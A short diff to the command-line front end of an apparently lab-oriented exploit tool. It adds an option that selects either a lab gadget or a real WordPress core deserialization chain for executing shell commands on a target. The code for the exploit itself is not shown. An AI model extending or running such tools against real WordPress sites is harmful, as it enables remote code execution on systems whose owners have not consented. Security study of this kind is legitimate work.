@@ -94,6 +94,10 @@ def main() -> int:
                    help="shell command to execute on the target")
     p.add_argument("--attempts", type=int, default=40, metavar="N",
                    help="maximum interruption attempts (default: 40)")
+    p.add_argument("--chain", choices=("filecache", "wordpress"),
+                   default="filecache",
+                   help="planted gadget: the lab's FileCache (default) "
+                        "or the real WordPress core chain (WP_HTML_Token)")
     p.add_argument("-q", "--quiet", action="store_true",
                    help="only print the command output")
     p.add_argument("--version", action="version",
@@ -112,7 +116,7 @@ def main() -> int:
         print(f"\033[1;36m[*] command \033[0m{args.command}\n")
 
     res = remote.exploit(host, port, args.command, args.attempts,
-                         verbose=not args.quiet)
+                         verbose=not args.quiet, chain=args.chain)
     if res.get("error"):
         print(f"\033[1;31m[!] {res['error']}\033[0m")
         return 2
